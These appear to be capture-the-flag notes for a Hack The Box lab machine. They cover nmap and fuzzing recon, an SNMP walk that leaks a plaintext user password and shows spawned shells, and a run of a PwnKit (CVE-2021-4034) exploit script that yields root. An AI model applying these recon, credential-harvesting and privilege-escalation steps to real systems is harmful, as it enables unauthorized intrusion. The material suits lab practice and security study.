# scanning
* `TCP` Scan
TARGET=10.10.11.136 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

nmap -p- --min-rate=1000 -T4 10.10.11.136 -Pn -sU -vvv

PORT   STATE SERVICE REASON         VERSION
## 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

## 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-server-header: Apache/2.4.41 (Ubuntu)

# dir enum
> dirsearch -u http://panda.htb -f -i 200

[07:48:16] 200 -    2KB - /assets/
[07:48:56] 200 -   33KB - /index.html

# subdomain
> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://panda.htb/" -H "Host: FUZZ.panda.htb" --hl 907
none


support@panda.htb
contact@panda.htb
PLAY is an extention of Panda.HTB, bringing network monitoring solutions to
Working together with Panda.HTB we provide delivery, installation and usage on
    Is PLAY part of Panda.HTB?
Yes PLAY is an extension of Panda.HTB.


# snmpwalk
```
iso.3.6.1.2.1.25.4.2.1.5.795 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.802 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.803 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.805 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.806 = ""
iso.3.6.1.2.1.25.4.2.1.5.808 = ""
iso.3.6.1.2.1.25.4.2.1.5.840 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.842 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.851 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.864 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.865 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.866 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.867 = ""
iso.3.6.1.2.1.25.4.2.1.5.922 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.979 = ""
iso.3.6.1.2.1.25.4.2.1.5.981 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.1126 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.20087 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.20638 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.20760 = STRING: "-c uname -a; w; id; /bin/sh -i"
iso.3.6.1.2.1.25.4.2.1.5.20764 = STRING: "-i"
iso.3.6.1.2.1.25.4.2.1.5.20765 = STRING: "-c import pty;pty.spawn(\"/bin/bash\")"

```

`daniel:HotelBabylon23`



# pe
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31

Vulnerable to CVE-2021-4034

Vulnerable to CVE-2021-3560

daniel@pandora:~$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.
[-] GCONV_PATH=. directory already exists, continuing.
[-] exploit directory already exists, continuing.
[+] Calling execve()
# id
uid=0(root) gid=1001(daniel) groups=1001(daniel)
# cd
# ls
 CVE-2021-4034.py  'GCONV_PATH=.'   exploit   linpeas.sh   payload.so
# cd
# ls
 CVE-2021-4034.py  'GCONV_PATH=.'   exploit   linpeas.sh   payload.so
# cd /root
# ls
root.txt
# cat root
cat: root: No such file or directory
# cat root.txt	
# cat /home/matt/user.txt

# ref
https://brainful.blog/2022/01/19/enumeration-2/